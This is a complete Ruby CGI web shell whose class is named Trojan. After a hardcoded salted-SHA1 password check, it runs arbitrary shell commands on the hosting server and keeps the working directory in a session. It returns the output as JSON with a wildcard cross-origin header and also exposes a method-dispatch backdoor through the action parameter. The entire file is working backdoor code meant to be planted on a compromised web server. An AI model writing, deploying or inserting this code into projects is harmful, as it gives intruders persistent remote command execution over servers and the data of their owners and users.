#!/usr/bin/env ruby
require 'cgi'
require 'cgi/session'
require 'cgi/session/pstore'
require 'digest/sha1'
require 'json'

class Trojan
    attr_accessor :cgi, :cwd, :response, :session

    def initialize params
        @cgi      = params[:cgi]
        @session  = params[:session]
        @cwd      = (@session[:cwd].nil?) ? `pwd`.strip! : @session[:cwd]
        @response = {};
    end

    def process_command()
        json = @cgi.params
        if json['action'].first.eql? 'shell'
            process_shell_command(json['cmd'].first)
        else
            send json['action'].first, json
        end
    end

    def process_shell_command command
        out_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split "\n"
        @cwd                = @session[:cwd] = out_lines.pop
        @response['output'] = out_lines.join "\n"
        self.send_response
    end

    def send_response
        @response['prompt_context'] = self.get_prompt_context
        puts @cgi.header('Access-Control-Allow-Origin: *')
        puts @response.to_json
        exit
    end

    def get_prompt_context
        whoami          =  `whoami`.strip!
        hostname        =  `hostname`.strip!
        line_terminator =  (whoami == 'root') ? '#' : '$';
        return "#{whoami}@#{hostname}:#{@cwd}#{line_terminator}";
    end

    def method_missing method, *args
        @response['error'] = "#{method} unsupported"
        self.send_response
    end
end

# ---------- Procedural code starts here ----------

cgi  = CGI.new

hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + 'c5e5f704ee')
if hash.eql? '003da5748a1cdeac275548be9741cb35b76f773d'
    session = CGI::Session.new(
        cgi,
        'database_manager' => CGI::Session::PStore,
        'session_key'      => 'wash',
        'session_expires'  => Time.now + 30 * 60,
        'prefix'           => 'wash_pstore_sid_'
    )
    trojan = Trojan.new({
        :cgi     => cgi, 
        :session => session, 
    })
    trojan.process_command
    session.close
else
    puts cgi.header('Access-Control-Allow-Origin: *')
    puts '{"error":"Invalid password."}'
end